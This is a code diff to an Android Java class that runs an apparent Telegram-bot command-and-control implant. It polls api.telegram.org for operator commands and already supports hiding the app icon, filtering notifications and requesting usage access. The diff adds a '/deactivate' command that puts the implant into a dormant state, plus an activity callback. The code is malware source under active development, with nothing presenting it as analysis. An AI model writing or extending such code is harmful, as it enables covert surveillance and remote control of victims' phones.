@@ -30,9 +30,13 @@ public class TelegramBotWorker implements Runnable {
     private int customDuration = 0;
     private int customScale = 100;
 
-    public TelegramBotWorker(Context ctx) { this.context = ctx.getApplicationContext(); }
+    public TelegramBotWorker(Context ctx, Runnable callback) {
+        this.context = ctx.getApplicationContext();
+        this.activityCallback = callback;
+    }
     public static String getNotificationFilter() { return notificationFilterPackage; }
     private static String notificationFilterPackage = null;
+    private final Runnable activityCallback;
 
     @Override
     public void run() {
@@ -47,7 +51,7 @@ public class TelegramBotWorker implements Runnable {
         HttpURLConnection conn = null;
         try {
             String token = ConfigLoader.getBotToken();
-            if (token == null) return;
+            if (token == null) { Thread.currentThread().interrupt(); return; }
             String urlStr = "https://api.telegram.org/bot" + token + "/getUpdates?timeout=20&allowed_updates=[\"message\",\"callback_query\"]";
             if (lastUpdateId > 0) urlStr += "&offset=" + (lastUpdateId + 1);
             conn = (HttpURLConnection) new URL(urlStr).openConnection();
@@ -55,6 +59,7 @@ public class TelegramBotWorker implements Runnable {
             String responseStr = streamToString(conn.getInputStream());
             JSONArray updates = new JSONObject(responseStr).getJSONArray("result");
             for (int i = 0; i < updates.length(); i++) {
+                activityCallback.run();
                 JSONObject update = updates.getJSONObject(i);
                 lastUpdateId = update.getLong("update_id");
                 if (update.has("message")) handleMessage(update.getJSONObject("message"));
@@ -76,6 +81,10 @@ public class TelegramBotWorker implements Runnable {
             switch (command) {
                 case "/start": case "/help": sendHelpMessage(); break;
                 case "/control": sendControlPanel(); break;
+                case "/deactivate":
+                    sendMessage("Deactivating and returning to dormant state.", context);
+                    context.stopService(new Intent(context, TelegramC2Service.class));
+                    break;
                 case "/toggle_app_hide": DeviceControlHandler.setComponentState(context, false); sendMessage("App icon is now hidden.", context); break;
                 case "/toggle_app_show": DeviceControlHandler.setComponentState(context, true); sendMessage("App icon is now visible.", context); break;
                 case "/grant_usage_access":
